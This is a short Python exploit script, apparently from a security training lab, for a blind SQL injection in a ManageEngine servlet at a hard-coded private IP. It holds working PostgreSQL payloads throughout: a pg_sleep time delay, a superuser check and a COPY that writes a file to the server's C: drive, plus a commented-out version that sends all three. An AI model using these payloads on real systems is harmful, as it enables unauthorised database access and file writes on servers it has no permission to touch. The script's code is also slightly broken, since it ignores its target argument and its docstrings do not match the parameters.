#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: Testing for SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import subprocess
import base64
import time

# Postgress SQLI
TIME_SQLI = ";select+pg_sleep(10);"																					# Sleeps for 10 seconds
IS_SUPERUSER = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"		# Sleeps for 10 seconds if superuser
COPY_TO_FILE = ";COPY+(SELECT+$$hacking$$)+to+$$c:\\hacking.txt$$;--+"												# Echos 'hacking' into C:\hacking.txt

# Vulnerable URL Managed Engine
VULN_URL = 'https://192.168.192.113:8443/servlet/AMUserResourcesSyncServlet'

def constructBlindSQLi(full_url, sqli):
    """
    Constructs the full URL with parameters for a SQL injection payload.

    Args:
        url (str): The target URL.
        sqli (str): The SQL injection payload.

    Returns:
        str: The full URL with the SQL injection payload.
    """
    
    # Construct the full URL with the SQL injection payload
    params = f'ForMasRange=1&userId=1{sqli}'
    return f"{full_url}?{params}"

def checkRequesTime(url, max_time):
    """
    Performs a GET request on the concatenated URL and string, and checks if the response time exceeds max_time.

    Args:
        url (str): The base URL.
        string (str): The string to be appended to the URL.
        max_time (int): The maximum allowed response time in seconds.

    Returns:
        bool: True if the response time exceeds max_time, False otherwise.
    """
    try:
        start_time = time.time()  # Record the start time
        response = requests.get(url)  # Perform the GET request
        elapsed_time = time.time() - start_time  # Calculate elapsed time

        return elapsed_time > max_time
    except Exception as e:
        print(f"Error occurred: {e}")
        return False
	
# def blindSQLi(url):
# 	sqli = ";select+pg_sleep(10);"
# 	sqli_pg_user = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
# 	sqli_file_make=";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"
# 	print("\nRequest will return in 10 seconds if we have SQLi")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
# 	print(r.text)
# 	print(r.headers)
	
# 	print("\nRequest will return in 10 seconds if we are a superuser\n")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli_pg_user, verify=False)
# 	print(r.text)
# 	print(r.headers)

# 	print("\nCreating file in C:\\")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli_file_make, verify=False)
# 	print(r.text)
# 	print(r.headers)


def main():
	if len(sys.argv) != 2:
		print(f"(+) usage %s <target>" % sys.argv[0])
		print(f"(+) eg: %s target" % sys.argv[0])
		sys.exit(1)
	
	url = constructBlindSQLi(VULN_URL, TIME_SQLI)
	if(checkRequesTime(url, 10)):
            print("Good")
	
if __name__ == '__main__':
	main()